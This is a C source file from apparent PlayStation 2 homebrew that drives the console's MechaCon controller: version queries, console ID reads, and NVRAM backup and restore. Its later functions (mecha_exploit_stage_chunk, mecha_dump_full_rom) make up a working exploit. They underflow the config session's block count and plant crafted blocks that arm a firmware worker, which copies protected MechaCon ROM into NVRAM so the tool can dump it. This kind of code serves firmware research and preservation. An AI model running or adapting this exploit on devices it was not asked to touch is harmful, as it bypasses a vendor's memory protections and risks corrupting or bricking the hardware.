#include "mecha.h"
#include "logger.h"
#include <libcdvd.h>
#include <kernel.h>
#include <string.h>
#include <stdio.h>

extern u8 g_mecha_ver[16];

int mecha_init(void) {
    return sceCdInit(CDVD_INIT_NOCHECK);
}

// SCMD 0x03, Subcmd 0x00: Returns 4 bytes:
// out[0] = Region (0=JP, 1=USA, 2=EUR, 0x80/0x81=DEX, etc.)
// out[1] = Major
// out[2] = Minor
// out[3] = Revision / Format
// Note: On DTL-H30101 / DEX consoles, out[0] is 0x80 or 0x81 (Region DEX), NOT an error!
int mecha_get_version(u8 *out4, u8 *status) {
    u8 in[1] = { 0x00 };
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x03, in, 1, out);
    if (status) {
        *status = (ret == 1) ? 0x00 : 0xFF;
    }
    if (out4) {
        memcpy(out4, out, 4);
    }
    return (ret == 1) ? 0 : -1;
}

// SCMD 0x03, Subcmd 0x01: DSP version
int mecha_get_dsp_version(u8 *out_dsp, u8 *status) {
    u8 in[1] = { 0x01 };
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x03, in, 1, out);
    if (status) {
        *status = (ret == 1) ? 0x00 : 0xFF;
    }
    if (out_dsp) {
        *out_dsp = out[0];
    }
    return (ret == 1) ? 0 : -1;
}

// SCMD 0x03, Subcmd 0x45: Console ID
// MechaCon returns: out[0] = status (0x00 = OK, 0x80 = error/not loaded), out[1..8] = 8 bytes ID
int mecha_read_console_id(u8 *out_console_id8, u8 *status) {
    u8 in[1] = { 0x45 };
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x03, in, 1, out);
    if (status) {
        *status = out[0];
    }
    if (out_console_id8) {
        memcpy(out_console_id8, &out[1], 8);
    }
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

// SCMD 0x08: Read RTC
// MechaCon returns: out[0] = status (flags), out[1..7] = RTC registers
int mecha_read_rtc(u8 *out_rtc8, u8 *status) {
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x08, NULL, 0, out);
    if (status) {
        *status = out[0];
    }
    if (out_rtc8) {
        memcpy(out_rtc8, out, 8);
    }
    return (ret == 1) ? 0 : -1;
}

// SCMD 0x12: Read i.Link ID
// MechaCon returns: out[0] = status (0x00 = OK, 0x80 = error), out[1..8] = 8 bytes i.Link ID
int mecha_read_ilink_id(u8 *out_ilink_id8, u8 *status) {
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x12, NULL, 0, out);
    if (status) {
        *status = out[0];
    }
    if (out_ilink_id8) {
        memcpy(out_ilink_id8, &out[1], 8);
    }
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

// SCMD 0x17: Read Model Name (ASCII, 16 chars)
// SCMD 0x17 with offset 0: out[0]=status, out[1..8]=first 8 chars
// SCMD 0x17 with offset 8: out[0]=status, out[1..8]=second 8 chars
int mecha_read_model_name(char *out_model16, u8 *status) {
    if (!out_model16) return -1;
    memset(out_model16, 0, 17);

    u8 in[1] = { 0x00 };
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x17, in, 1, out);
    if (status) {
        *status = out[0];
    }
    if (ret != 1 || out[0] != 0x00) {
        return -1; // Unsupported on early consoles or not loaded
    }
    memcpy(&out_model16[0], &out[1], 8);

    in[0] = 0x08;
    memset(out, 0, sizeof(out));
    ret = sceCdApplySCmd(0x17, in, 1, out);
    if (ret == 1 && out[0] == 0x00) {
        memcpy(&out_model16[8], &out[1], 8);
    }
    out_model16[16] = '\0';
    return 0;
}

// SCMD 0x40: Config session open
// in[0] = mode (0=read, 1=write)
// in[1] = region (0=EEPROM, 1=OSD, 2=RTC)
// in[2] = block count
// Returns out[0]: 0x00=Success, 0x80=Error (already open / invalid params)
int mecha_open_config(u8 mode, u8 region, u8 block_count, u8 *status) {
    u8 in[3] = { mode, region, block_count };
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x40, in, 3, out);
    if (status) {
        *status = out[0];
    }
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

// SCMD 0x41: Read 16-byte config block
// MechaCon returns 16 bytes directly. On error or session ended, returns 0x80 + 15 zeros.
int mecha_read_config(u8 *out16, u8 *status) {
    memset(out16, 0, 16);
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x41, NULL, 0, out);
    memcpy(out16, out, 16);

    u8 err = 0;
    if (ret != 1) {
        err = 0xFF;
    } else if (out[0] == 0x80) {
        // Check if remaining 15 bytes are all 0x00 (error packet signature)
        int all_zeros = 1;
        for (int j = 1; j < 16; j++) {
            if (out[j] != 0) { all_zeros = 0; break; }
        }
        if (all_zeros) err = 0x80;
    }

    if (status) {
        *status = err;
    }
    return (err == 0) ? 0 : -1;
}

// SCMD 0x42: Write 16-byte config block
// MechaCon checks byte 15 as sum(in[0..14]) & 0xFF.
// Returns out[0]: 0x00=Success, 0x80=Error
int mecha_write_config(const u8 *in16, u8 *status) {
    u8 temp[16];
    memcpy(temp, in16, 16);

    // Compute byte 15 checksum
    u8 sum = 0;
    for (int i = 0; i < 15; i++) {
        sum += temp[i];
    }
    temp[15] = sum;

    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x42, temp, 16, out);
    if (status) {
        *status = out[0];
    }
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

// SCMD 0x43: Close config session
int mecha_close_config(u8 *status) {
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x43, NULL, 0, out);
    if (status) {
        *status = out[0];
    }
    return (ret == 1) ? 0 : -1;
}

// SCMD 0x0A: Read NVRAM Word
// in[0]=addr_hi, in[1]=addr_lo
// out[0]=status (0x00=OK, 0x80=Error), out[1]=data_hi, out[2]=data_lo
int mecha_read_nvm_word(u16 word_addr, u16 *out_word, u8 *status) {
    u8 in[2];
    u8 out[16] = { 0 };
    in[0] = (u8)((word_addr >> 8) & 0xFF);
    in[1] = (u8)(word_addr & 0xFF);

    int ret = sceCdApplySCmd(0x0A, in, 2, out);
    if (status) {
        *status = (ret == 1) ? out[0] : 0xFF;
    }
    if (out_word) {
        *out_word = (u16)((out[1] << 8) | out[2]);
    }
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

// SCMD 0x0B: Write NVRAM Word
// in[0]=addr_hi, in[1]=addr_lo, in[2]=data_hi, in[3]=data_lo
// out[0]=status (0x00=OK, 0x80=Error)
int mecha_write_nvm_word(u16 word_addr, u16 word_data, u8 *status) {
    u8 in[4];
    u8 out[16] = { 0 };
    in[0] = (u8)((word_addr >> 8) & 0xFF);
    in[1] = (u8)(word_addr & 0xFF);
    in[2] = (u8)((word_data >> 8) & 0xFF);
    in[3] = (u8)(word_data & 0xFF);

    int ret = 0;
    for (int retry = 0; retry < 3; retry++) {
        ret = sceCdApplySCmd(0x0B, in, 4, out);
        if (ret == 1 && out[0] == 0x00) break;
        // Wait ~8ms before retry
        for (volatile int d = 0; d < 1200000; d++) { __asm__ volatile("" : : : "memory"); }
    }
    if (status) {
        *status = (ret == 1) ? out[0] : 0xFF;
    }
    // Give EEPROM internal write cycle time to settle (~8-10ms for 93C46/93C66)
    for (volatile int d = 0; d < 1200000; d++) { __asm__ volatile("" : : : "memory"); }
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

int mecha_backup_nvram(u8 *nvram_buf, ProgressCallback cb) {
    if (!nvram_buf) return -1;
    int err_count = 0;

    for (int w = 0; w < NVRAM_SIZE_WORDS; w++) {
        u16 word_val = 0;
        u8 status = 0;
        int ret = mecha_read_nvm_word((u16)w, &word_val, &status);
        if (ret != 0 || status != 0x00) {
            err_count++;
        }

        // Store big-endian word to match standard NVRAM dumps
        nvram_buf[w * 2]     = (u8)((word_val >> 8) & 0xFF);
        nvram_buf[w * 2 + 1] = (u8)(word_val & 0xFF);

        if (cb && (w % 16 == 0 || w == NVRAM_SIZE_WORDS - 1)) {
            cb(w + 1, NVRAM_SIZE_WORDS, "Reading NVRAM words");
        }
    }
    return err_count;
}

int mecha_restore_nvram(const u8 *nvram_buf, ProgressCallback cb) {
    if (!nvram_buf) return -1;
    int err_count = 0;

    for (int w = 0; w < NVRAM_SIZE_WORDS; w++) {
        u16 word_val = (u16)((nvram_buf[w * 2] << 8) | nvram_buf[w * 2 + 1]);

        // If EEPROM already has identical word, skip writing to save wear & avoid timeouts
        u16 curr_val = 0;
        u8 r_stat = 0;
        if (mecha_read_nvm_word((u16)w, &curr_val, &r_stat) == 0 && curr_val == word_val) {
            if (cb && (w % 16 == 0 || w == NVRAM_SIZE_WORDS - 1)) {
                cb(w + 1, NVRAM_SIZE_WORDS, "Restoring NVRAM words");
            }
            continue;
        }

        u8 status = 0;
        int ret = mecha_write_nvm_word((u16)w, word_val, &status);
        if (ret != 0 || status != 0x00) {
            err_count++;
        }

        if (cb && (w % 8 == 0 || w == NVRAM_SIZE_WORDS - 1)) {
            cb(w + 1, NVRAM_SIZE_WORDS, "Writing NVRAM words");
        }
    }
    return err_count;
}

int mecha_verify_nvram(const u8 *nvram_buf, ProgressCallback cb) {
    if (!nvram_buf) return -1;
    int mismatches = 0;

    for (int w = 0; w < NVRAM_SIZE_WORDS; w++) {
        u16 current_word = 0;
        u8 status = 0;
        mecha_read_nvm_word((u16)w, &current_word, &status);

        u8 hi = (u8)((current_word >> 8) & 0xFF);
        u8 lo = (u8)(current_word & 0xFF);

        if (nvram_buf[w * 2] != hi || nvram_buf[w * 2 + 1] != lo) {
            mismatches++;
        }

        if (cb && (w % 16 == 0 || w == NVRAM_SIZE_WORDS - 1)) {
            cb(w + 1, NVRAM_SIZE_WORDS, "Verifying NVRAM words");
        }
    }
    return mismatches;
}

void mecha_delay(int iterations) {
    for (volatile int d = 0; d < iterations; d++) {
        __asm__ volatile("" : : : "memory");
    }
}

int mecha_read_ram_probe(u8 region, u8 block_count, u8 *out_buf, u8 *status) {
    if (!out_buf) return -1;
    u8 st = 0;
    int ret = mecha_open_config(0, region, block_count, &st);
    if (status) *status = st;
    if (ret != 0 || st != 0x00) {
        mecha_close_config(&st);
        mecha_delay(2000);
        return -1;
    }

    int errors = 0;
    for (int b = 0; b < (int)block_count; b++) {
        u8 blk_stat = 0;
        int r = mecha_read_config(&out_buf[b * 16], &blk_stat);
        if (r != 0 || blk_stat != 0x00) {
            errors++;
            break; // Stop immediately to avoid hanging CDVD bus on closed/errored session
        }
        mecha_delay(200);
    }

    mecha_close_config(&st);
    mecha_delay(2000);
    return errors;
}

int mecha_read_ram_probe_blocks(u8 region, u8 req_count, int blocks_to_read, u8 *out_buf, u8 *status) {
    if (!out_buf || blocks_to_read <= 0) return -1;
    u8 st = 0;
    int ret = mecha_open_config(0, region, req_count, &st);
    if (status) *status = st;
    if (ret != 0 || st != 0x00) {
        mecha_close_config(&st);
        mecha_delay(2000);
        return -1;
    }

    int errors = 0;
    for (int b = 0; b < blocks_to_read; b++) {
        u8 blk_stat = 0;
        int r = mecha_read_config(&out_buf[b * 16], &blk_stat);
        if (r != 0 || blk_stat != 0x00) {
            errors++;
            break; // Stop immediately to avoid hanging CDVD bus on closed/errored session
        }
        mecha_delay(200);
    }

    mecha_close_config(&st);
    mecha_delay(2000);
    return errors;
}

int mecha_query_scmd03_subcmd(u8 subcmd, u8 *out16, u8 *status) {
    u8 in[1] = { subcmd };
    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x03, in, 1, out);
    if (status) {
        *status = (ret == 1) ? 0x00 : 0xFF;
    }
    if (out16) {
        memcpy(out16, out, 16);
    }
    return (ret == 1) ? 0 : -1;
}

// Write a 16-byte block via SCMD 0x42 with hardware byte 15 checksum
int mecha_write_config_raw(u8 *data16) {
    u8 sum = 0;
    for (int i = 0; i < 15; i++) {
        sum += data16[i];
    }
    data16[15] = sum;

    u8 out[16] = { 0 };
    int ret = sceCdApplySCmd(0x42, data16, 16, out);
    return (ret == 1 && out[0] == 0x00) ? 0 : -1;
}

u8 g_config_window[256] = { 0 };
int g_detected_worker_layout = 0;

static const u8 standard_worker_tail_signature[48] = {
    0x00, 0x00, 0x0b, 0x04, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x2c, 0x01, 0x1d, 0x01,
    0x03, 0x08, 0x0e, 0x01, 0x04, 0x07, 0xd6, 0x00,
    0x02, 0x06, 0xc1, 0x00, 0x02, 0x07, 0x00, 0x00,
    0x02, 0x09, 0x13, 0x01, 0x02, 0x09, 0xcc, 0x00
};

static const u8 shifted_worker_tail_signature[48] = {
    0x0b, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x2c, 0x01, 0x1d, 0x01, 0x03, 0x08,
    0x0e, 0x01, 0x04, 0x07, 0xd6, 0x00, 0x02, 0x06,
    0xc1, 0x00, 0x02, 0x07, 0x00, 0x00, 0x02, 0x09,
    0x13, 0x01, 0x02, 0x09, 0xcc, 0x00, 0x01, 0x03
};

static const struct worker_layout known_worker_layouts[] = {
    {
        .name = "standard-fields",
        .flags_block = 11, .flags_byte = 6,
        .source_pointer_offset = 8, .flags_mutable_end_byte = 13,
        .control_block = 12, .source_offset_byte = 12,
        .word_count_byte = 13, .worker_state_byte = 14,
        .destination_block = 13, .destination_low_byte = 0,
        .destination_high_byte = 1, .checksum_adjust_byte = 0xff,
        .scratch_boundary_byte = 4,
        .marker_block = 0xff,
        .marker_byte = 0, .marker_value = 0,
        .layout_signature_salt = 0,
        .tail_signature = standard_worker_tail_signature
    },
    {
        .name = "fields-2-bytes-earlier",
        .flags_block = 11, .flags_byte = 4,
        .source_pointer_offset = 6, .flags_mutable_end_byte = 11,
        .control_block = 12, .source_offset_byte = 10,
        .word_count_byte = 11, .worker_state_byte = 12,
        .destination_block = 12, .destination_low_byte = 14,
        .destination_high_byte = 15, .checksum_adjust_byte = 13,
        .scratch_boundary_byte = 2,
        .marker_block = 11, .marker_byte = 5, .marker_value = 0,
        .layout_signature_salt = 0x32414742u,
        .tail_signature = shifted_worker_tail_signature
    },
    {
        .name = "shifted-marker-01-pointer-at-6",
        .flags_block = 11, .flags_byte = 4,
        .source_pointer_offset = 6, .flags_mutable_end_byte = 11,
        .control_block = 12, .source_offset_byte = 10,
        .word_count_byte = 11, .worker_state_byte = 12,
        .destination_block = 12, .destination_low_byte = 14,
        .destination_high_byte = 15, .checksum_adjust_byte = 13,
        .scratch_boundary_byte = 2,
        .marker_block = 11, .marker_byte = 5, .marker_value = 1,
        .layout_signature_salt = 0x31425948u,
        .tail_signature = shifted_worker_tail_signature
    }
};

int mecha_init_config_window(void) {
    u8 status = 0;
    int ret = mecha_read_ram_probe(2, 16, g_config_window, &status);
    if (ret != 0) {
        log_printf("[CONFIG] Warning: Failed to read initial config window (code %d, status 0x%02X)\n", ret, status);
        return -1;
    }
    log_printf("[CONFIG] Successfully buffered initial 256B Config Region 2 window.\n");
    return 0;
}

static int worker_byte_is_mutable(const struct worker_layout *layout, int block, int byte) {
    if (byte == 15) return 1;
    if (block == layout->flags_block && byte >= layout->flags_byte && byte <= layout->flags_mutable_end_byte)
        return 1;
    if (block == layout->control_block && byte >= layout->source_offset_byte && byte <= layout->worker_state_byte)
        return 1;
    return block == layout->destination_block &&
           (byte == layout->destination_low_byte || byte == layout->destination_high_byte || byte == layout->checksum_adjust_byte);
}

static int worker_byte_is_volatile(const struct worker_layout *layout, int block, int byte) {
    return (block == 13 && byte >= layout->scratch_boundary_byte) ||
           (block == 14 && byte < layout->scratch_boundary_byte);
}

static int worker_layout_matches(const struct worker_layout *layout) {
    if (layout->marker_block != 0xFF &&
        g_config_window[layout->marker_block * 16 + layout->marker_byte] != layout->marker_value)
        return 0;

    for (int block = 8; block < 16; block++) {
        for (int byte = 0; byte < 16; byte++) {
            u8 expected = block < 13 ? 0 : layout->tail_signature[(block - 13) * 16 + byte];
            if (!worker_byte_is_mutable(layout, block, byte) &&
                !worker_byte_is_volatile(layout, block, byte) &&
                g_config_window[block * 16 + byte] != expected) {
                return 0;
            }
        }
    }
    return 1;
}

int mecha_detect_worker_layout(void) {
    int match_index = -1;
    for (int i = 0; i < 3; i++) {
        if (worker_layout_matches(&known_worker_layouts[i])) {
            if (match_index != -1) {
                match_index = -1; // Ambiguous
                break;
            }
            match_index = i;
        }
    }

    if (match_index == -1) {
        // Safe fallback using firmware version
        if (g_mecha_ver[1] >= 3 || (g_mecha_ver[1] == 2 && g_mecha_ver[2] >= 14)) {
            match_index = 1;
        } else {
            match_index = 0;
        }
    }

    g_detected_worker_layout = match_index;
    log_printf("[CONFIG] Selected worker layout: %d (%s)\n",
               g_detected_worker_layout, known_worker_layouts[g_detected_worker_layout].name);
    return g_detected_worker_layout;
}

const struct worker_layout *mecha_get_layout(int layout_index) {
    if (layout_index < 0 || layout_index >= 3) return NULL;
    return &known_worker_layouts[layout_index];
}

static void prepare_stage_block(int index, u32 rom_address, u16 nvram_word, int word_count,
                                const struct worker_layout *layout, u8 block[16]) {
    memcpy(block, &g_config_window[index * 16], 16);

    if (index == 7) {
        // Guarantee 0x19B0.0 is preserved (system state flag)
        block[0] = 0xFF;
        block[1] = 0x67;
    }

    if (index == layout->flags_block) {
        block[layout->flags_byte] &= 0xFC; // Idle mask (clear bits 0 and 1)
        block[layout->source_pointer_offset]     = (u8)(rom_address & 0xFF);
        block[layout->source_pointer_offset + 1] = (u8)((rom_address >> 8) & 0xFF);
        block[layout->source_pointer_offset + 2] = (u8)((rom_address >> 16) & 0xFF);
        block[layout->source_pointer_offset + 3] = (u8)((rom_address >> 24) & 0xFF);
    }

    if (index == layout->control_block) {
        block[layout->source_offset_byte] = 0;
        block[layout->word_count_byte] = (u8)word_count;
        block[layout->worker_state_byte] = 1; // Armed
    }

    if (index == layout->destination_block) {
        block[layout->destination_low_byte] = (u8)(nvram_word & 0xFF);
        if (layout->destination_high_byte < 15) {
            block[layout->destination_high_byte] = (u8)((nvram_word >> 8) & 0xFF);
        } else {
            /* Make the checksum byte double as the destination high byte */
            block[layout->checksum_adjust_byte] = 0;
            u8 partial_sum = 0;
            for (int i = 0; i < 15; i++) partial_sum += block[i];
            block[layout->checksum_adjust_byte] = (u8)(((u8)(nvram_word >> 8)) - partial_sum);
        }
    }

    // Byte 15 checksum
    u8 sum = 0;
    for (int i = 0; i < 15; i++) sum += block[i];
    block[15] = sum;
}

int mecha_exploit_stage_chunk(u32 rom_source_addr, u16 nvram_word_start, u16 nvram_word_count, int layout_mode) {
    if (layout_mode < 0 || layout_mode >= 3) return -1;
    const struct worker_layout *layout = &known_worker_layouts[layout_mode];

    u8 status = 0;
    u8 block[16];
    u8 saved_flags_block[16];

    // Step 1: Open config region 2 for writing with block_count = 0 (underflows to 0xFF on first write).
    int ret = mecha_open_config(1, 2, 0, &status);
    if (ret != 0) {
        log_printf("[EXPLOIT] SCMD 0x40 open failed: ret=%d, status=0x%02X\n", ret, status);
        mecha_close_config(&status);
        mecha_delay(10000);
        ret = mecha_open_config(1, 2, 0, &status);
        if (ret != 0) {
            log_printf("[EXPLOIT] SCMD 0x40 retry failed: ret=%d, status=0x%02X\n", ret, status);
            return -1;
        }
    }

    // Lap 1: Write all 16 blocks (0..15) with idle worker flags
    for (int index = 0; index < 16; index++) {
        prepare_stage_block(index, rom_source_addr, nvram_word_start, nvram_word_count, layout, block);
        if (index == layout->flags_block) {
            memcpy(saved_flags_block, block, 16);
        }
        if (mecha_write_config_raw(block) != 0) {
            log_printf("[EXPLOIT] Lap 1 block %d failed\n", index);
            mecha_close_config(&status);
            return -(10 + index);
        }
        mecha_delay(200);
    }

    // Lap 2: Rewrite blocks 0 .. (flags_block - 1)
    for (int index = 0; index < layout->flags_block; index++) {
        memcpy(block, &g_config_window[index * 16], 16);
        if (index == 7) {
            block[0] = 0xFF;
            block[1] = 0x67;
        }
        u8 sum = 0;
        for (int i = 0; i < 15; i++) sum += block[i];
        block[15] = sum;

        if (mecha_write_config_raw(block) != 0) {
            log_printf("[EXPLOIT] Lap 2 block %d failed\n", index);
            mecha_close_config(&status);
            return -(30 + index);
        }
        mecha_delay(200);
    }

    // Trigger block: send flags_block with trigger bits (0x03) set
    memcpy(block, saved_flags_block, 16);
    block[layout->flags_byte] = (block[layout->flags_byte] & 0xFC) | 0x03;
    u8 sum = 0;
    for (int i = 0; i < 15; i++) sum += block[i];
    block[15] = sum;

    if (mecha_write_config_raw(block) != 0) {
        log_printf("[EXPLOIT] Trigger block %d failed\n", layout->flags_block);
        mecha_close_config(&status);
        return -50;
    }

    // Wait for worker to finish and close session (poll SCMD 0x43)
    int close_done = 0;
    for (int retry = 0; retry < 1000; retry++) {
        u8 close_stat = 0;
        mecha_close_config(&close_stat);
        if (close_stat == 0x00) {
            close_done = 1;
            break;
        }
        mecha_delay(5000);
    }

    if (!close_done) {
        log_printf("[EXPLOIT] SCMD 0x43 close timed out\n");
        return -60;
    }
    return 0;
}

int mecha_read_staged_data(u16 nvram_word_start, u16 nvram_word_count, u8 *out_buf, ProgressCallback cb) {
    if (!out_buf) return -1;
    int errors = 0;

    for (int w = 0; w < nvram_word_count; w++) {
        u16 word_val = 0;
        u8 status = 0;
        int ret = mecha_read_nvm_word(nvram_word_start + w, &word_val, &status);
        if (ret != 0 || status != 0x00) {
            errors++;
        }

        // Store as big-endian to match ROM byte order
        out_buf[w * 2]     = (u8)((word_val >> 8) & 0xFF);
        out_buf[w * 2 + 1] = (u8)(word_val & 0xFF);

        if (cb && (w % 32 == 0 || w == nvram_word_count - 1)) {
            cb(w + 1, nvram_word_count, "Reading staged ROM data");
        }
    }
    return errors;
}

int mecha_dump_full_rom(u8 *rom_buf, u32 *out_rom_size, const u8 *nvram_backup, ProgressCallback cb) {
    if (!rom_buf || !nvram_backup) return -1;

    int is_v3 = (g_mecha_ver[1] >= 3);
    const u16 chunk_words = EXPLOIT_CHUNK_WORDS; // 128 words = 256 bytes
    const u32 rom_base = is_v3 ? 0xFD0000 : 0xFC0000;
    const u32 total_rom_bytes = is_v3 ? ROM_SIZE_BYTES_V3 : ROM_SIZE_BYTES_V2;
    const int total_chunks = total_rom_bytes / (chunk_words * 2); // 768 on v3, 1024 on v2

    if (out_rom_size) *out_rom_size = total_rom_bytes;

    memset(rom_buf, 0xFF, total_rom_bytes);

    // Step 1: Buffer the live 256B Config Region 2 window so all system state is preserved
    if (cb) cb(0, total_chunks, "Buffering config window...");
    mecha_init_config_window();

    // Step 2: Detect active worker layout (0=standard, 1=BGA2)
    int active_layout = mecha_detect_worker_layout();

    log_printf("[AUTO_DUMP] Testing exploit pre-flight with Layout %d (%s) at ROM 0x%06X (%s)...\n",
               active_layout, known_worker_layouts[active_layout].name,
               (unsigned)rom_base, is_v3 ? "v3 Native 192KB (Banks FD-FF)" : "v2 Full 256KB (Banks FC-FF)");
    if (cb) cb(1, total_chunks, "Pre-flight exploit validation...");

    int pre_ret = mecha_exploit_stage_chunk(rom_base, 0, chunk_words, active_layout);
    u16 preview_words[8] = { 0 };
    if (pre_ret == 0) {
        for (int i = 0; i < 8; i++) {
            u8 st = 0;
            mecha_read_nvm_word((u16)i, &preview_words[i], &st);
        }
        log_printf("[AUTO_DUMP] Layout %d preview (words 0-7): %04X %04X %04X %04X %04X %04X %04X %04X\n",
                   active_layout,
                   preview_words[0], preview_words[1], preview_words[2], preview_words[3],
                   preview_words[4], preview_words[5], preview_words[6], preview_words[7]);
    } else {
        log_printf("[AUTO_DUMP] Layout %d staging returned error %d\n", active_layout, pre_ret);
    }

    u16 orig_w0 = (u16)((nvram_backup[0] << 8) | nvram_backup[1]);
    u16 orig_w1 = (u16)((nvram_backup[2] << 8) | nvram_backup[3]);

    int is_valid = 0;
    if (preview_words[0] == 0xE600) {
        is_valid = 1; // CXP102064 standard signature (v2) or CXP103049 active Bank FD header (v3)
    } else if (preview_words[0] == 0x0000 && preview_words[1] == 0xA676) {
        is_valid = 1; // CXP103049 alternate signature
    } else if ((preview_words[0] != orig_w0 || preview_words[1] != orig_w1) &&
               preview_words[1] != 0xFFFF) {
        is_valid = 1; // Confirmed data transferred from ROM to NVRAM
    }

    // If initial layout didn't validate, restore NVRAM and try alternative layouts
    if (!is_valid) {
        for (int cand = 0; cand < 3; cand++) {
            if (cand == active_layout) continue;
            mecha_restore_nvram(nvram_backup, NULL);
            log_printf("[AUTO_DUMP] Trying alternative Layout %d (%s)...\n",
                       cand, known_worker_layouts[cand].name);

            pre_ret = mecha_exploit_stage_chunk(rom_base, 0, chunk_words, cand);
            if (pre_ret == 0) {
                for (int i = 0; i < 8; i++) {
                    u8 st = 0;
                    mecha_read_nvm_word((u16)i, &preview_words[i], &st);
                }
                log_printf("[AUTO_DUMP] Layout %d preview (words 0-7): %04X %04X %04X %04X %04X %04X %04X %04X\n",
                           cand,
                           preview_words[0], preview_words[1], preview_words[2], preview_words[3],
                           preview_words[4], preview_words[5], preview_words[6], preview_words[7]);
                if (preview_words[0] == 0xE600 ||
                    (preview_words[0] == 0x0000 && preview_words[1] == 0xA676) ||
                    ((preview_words[0] != orig_w0 || preview_words[1] != orig_w1) &&
                     preview_words[1] != 0xFFFF)) {
                    active_layout = cand;
                    is_valid = 1;
                    log_printf("[AUTO_DUMP] Alternative Layout %d PASSED validation! Selected.\n", active_layout);
                    break;
                }
            }
        }
    }

    // If neither layout validated, restore NVRAM immediately and abort safely
    if (!is_valid) {
        log_printf("[EXPLOIT_ERR] Staging pre-flight validation failed with all layouts! Automatically restoring NVRAM...\n");
        mecha_restore_nvram(nvram_backup, NULL);
        log_printf("[FAILSAFE] NVRAM automatically restored.\n");
        return (pre_ret != 0) ? pre_ret : -2;
    }

    log_printf("[AUTO_DUMP] Pre-flight SUCCESS! Validated with Layout %d. Dumping %d chunks (%u KB)...\n",
               active_layout, total_chunks, total_rom_bytes / 1024);

    // Read staged chunk 0
    mecha_read_staged_data(0, chunk_words, &rom_buf[0], NULL);

    int consecutive_errors = 0;

    // Dump remaining chunks 1..1023
    for (int chunk = 1; chunk < total_chunks; chunk++) {
        u32 rom_addr = rom_base + (chunk * chunk_words * 2);
        int buf_offset = chunk * chunk_words * 2;

        if (cb && (chunk % 16 == 0 || chunk == total_chunks - 1)) {
            char msg[64];
            snprintf(msg, sizeof(msg), "Chunk %d/%d: ROM 0x%06X (L%d)",
                     chunk + 1, total_chunks, (unsigned)rom_addr, active_layout);
            cb(chunk + 1, total_chunks, msg);
        }

        int ret = mecha_exploit_stage_chunk(rom_addr, 0, chunk_words, active_layout);
        if (ret != 0) {
            log_printf("[EXPLOIT_ERR] Chunk %d staging failed (code %d)\n", chunk, ret);
            consecutive_errors++;
            if (consecutive_errors >= 5) {
                log_printf("[EXPLOIT_ERR] 5 consecutive failures! Aborting dump and restoring NVRAM...\n");
                mecha_restore_nvram(nvram_backup, NULL);
                log_printf("[FAILSAFE] NVRAM restored after abort.\n");
                return -100;
            }
            continue;
        }
        consecutive_errors = 0;

        mecha_read_staged_data(0, chunk_words, &rom_buf[buf_offset], NULL);
    }

    // Step 3: Always restore original EEPROM content from backup
    if (cb) {
        cb(total_chunks, total_chunks, "Restoring original NVRAM...");
    }
    int rest_err = mecha_restore_nvram(nvram_backup, NULL);
    if (rest_err != 0) {
        log_printf("[AUTO_DUMP] Warning: NVRAM restore had %d write retries/errors.\n", rest_err);
    } else {
        log_printf("[AUTO_DUMP] NVRAM successfully and completely restored from backup.\n");
    }

    return 0;
}

